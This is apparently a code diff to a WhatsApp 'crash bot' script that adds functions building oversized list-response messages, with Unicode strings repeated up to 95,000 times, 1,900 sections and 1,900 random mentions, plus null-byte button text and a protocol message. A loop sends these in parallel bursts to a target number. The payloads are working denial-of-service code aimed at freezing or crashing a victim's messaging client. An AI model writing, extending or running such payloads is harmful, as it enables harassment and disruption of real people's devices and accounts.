@@ -1063,6 +1063,134 @@ async function LocaX(sock, target) {
     }]
   }, { participant: target })
 }
+async function VinzaIsX7Valid(sock, target) { 
+  const buttonFrezE = Array.from({ length: 1900 }, (_, r) => ({
+    title: "ោ៝".repeat(95000),
+    rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
+  }));
+
+  const MSG = {
+    viewOnceMessage: {
+      message: {
+        listResponseMessage: {
+          title: "sayonara...",
+          listType: 2,
+          buttonText: "Click",
+          sections: buttonFrezE,
+          singleSelectReply: { selectedRowId: "🩴" },
+          contextInfo: {
+            mentionedJid: [
+              target,
+              ...Array.from({ length: 1900 }, () =>
+                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
+              )
+            ],
+            participant: target,
+            remoteJid: "status@broadcast",
+            forwardingScore: 9741,
+            isForwarded: true,
+            forwardedNewsletterMessageInfo: {
+              newsletterJid: "333333333333@newsletter",
+              serverMessageId: 1,
+              newsletterName: "VinzaIsX7"
+            }
+          },
+          description: "x7"
+        }
+      }
+    }
+  };
+
+  try {
+    const msg = generateWAMessageFromContent(target, MSG, {});
+    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
+  } catch (err) {
+    console.error("Error in VinzaIsX7Valid:", err);
+  }
+}
+
+async function VinzaButtonSpam(sock, target) { 
+  const MSG = {
+    viewOnceMessage: {
+      message: {
+        buttonsResponseMessage: {
+          selectedButtonId: "BTN_1",
+          contextInfo: {
+            mentionedJid: [target],
+            participant: target,
+            remoteJid: "status@broadcast"
+          }
+        }
+      }
+    }
+  };
+
+  try {
+    const msg = generateWAMessageFromContent(target, MSG, {});
+    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
+  } catch (err) {
+    console.error("Error in VinzaButtonSpam:", err);
+  }
+}
+
+async function VinzaListX(sock, target) {
+  const sections = Array.from({ length: 1900 }, (_, r) => ({
+    title: "᭡꧈".repeat(2000),
+    rows: [{ title: `Row ${r + 1}`, id: `ID_${r + 1}` }]
+  }));
+
+  const MSG = {
+    viewOnceMessage: {
+      message: {
+        listResponseMessage: {
+          title: "ោ៝".repeat(4000),
+          listType: 2,
+          buttonText: "\u0000",
+          sections,
+          singleSelectReply: { selectedRowId: "👒" },
+          contextInfo: {
+            mentionedJid: [
+              target,
+              ...Array.from({ length: 1900 }, () =>
+                `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
+              )
+            ],
+            participant: target,
+            remoteJid: "status@broadcast"
+          },
+          description: "U-Kwon"
+        }
+      }
+    }
+  };
+
+  try {
+    const msg = generateWAMessageFromContent(target, MSG, {});
+    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
+  } catch (err) {
+    console.error("Error in VinzaListX:", err);
+  }
+}
+
+async function VinzaProtocol(sock, target) {
+  const MSG = {
+    viewOnceMessage: {
+      message: {
+        protocolMessage: {
+          key: { remoteJid: target, fromMe: false },
+          type: 14
+        }
+      }
+    }
+  };
+
+  try {
+    const msg = generateWAMessageFromContent(target, MSG, {});
+    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
+  } catch (err) {
+    console.error("Error in VinzaProtocol:", err);
+  }
+}
 async function spay(sock, jid) {
     const mentionedList = [
         "13135550002@s.whatsapp.net",
@@ -1139,21 +1267,18 @@ const sendNext = async () => {
     try {
         if (count < 1) {
             await Promise.all([
-            XProtexBlankXDelay(X),
-            XProtexBlankXDelay(X),
-            XProtexBlankXDelay(X),
-            XProtexBlankXDelay(X),
-            XProtexBlankXDelay(X),
-            XProtexBlankXDelay(X),
-            XProtexBlankXDelay(X),
-            XProtexBlankXDelay(X),
-            LocaX(X),
-            LocaX(X),
-            LocaX(X),
-            LocaX(X),
-            LocaX(X),
-            LocaX(X),
-            LocaX(X),
+            VinzaListX(X),
+            VinzaListX(X),
+            VinzaListX(X),
+            VinzaListX(X),
+            VinzaProtocol(X),
+            VinzaProtocol(X),
+            VinzaProtocol(X),
+            VinzaIsX7Valid(X),
+            VinzaIsX7Valid(X),
+            VinzaIsX7Valid(X),
+            VinzaIsX7Valid(X),
+            VinzaIsX7Valid(X),
             ]);
             await sleep(2000);
             console.log(chalk.red(`
